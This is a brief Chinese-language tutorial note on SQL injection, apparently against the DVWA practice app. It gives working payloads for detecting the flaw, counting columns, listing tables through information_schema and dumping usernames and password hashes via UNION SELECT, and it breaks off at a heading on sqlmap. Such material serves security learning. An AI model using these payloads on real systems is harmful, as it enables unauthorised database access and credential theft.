SQL：结构化查询语言（structured query language）用于操作数据库的语言

  

判断

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '1' and 1=1#';";//1=1正常输出
$query = "SELECT first_name, last_name FROM users WHERE user_id = '1' and 1=2#';";//1=2错误输出
满足上面则证明SQL语句生效，存在SQL注入漏洞
```

#：作用是注释（移除）后续SQL语句



利用

1.判断列/字段数：

```
order by [column_num]
```

逐渐增加num值，直到$n$出现报错，则说明该数据库有$n-1$列/字段

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' order by 2#';
```



2.联合查询其他信息：

```
union select [sql1][sql2]
```

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' union select user(),database()#';
```

user()：返回当前数据库连接用户

database()：返回当前数据库名称



3.联合查询表

```
union select table_name,table_schema from information_schema.tables where table_schema='[database_name]'
```

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' union select table_name,table_schema from information_schema.tables where table_schema='dvwa'#';
```

从information_schema数据库中查询dvwa数据库表



4.联合查询信息

```
union [query_sql]
```

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' union select user,password from users#';
```

查询当前数据库的users表中user和password数据



SQLmap：把复杂度利用过程自动化

第一步：检测漏洞

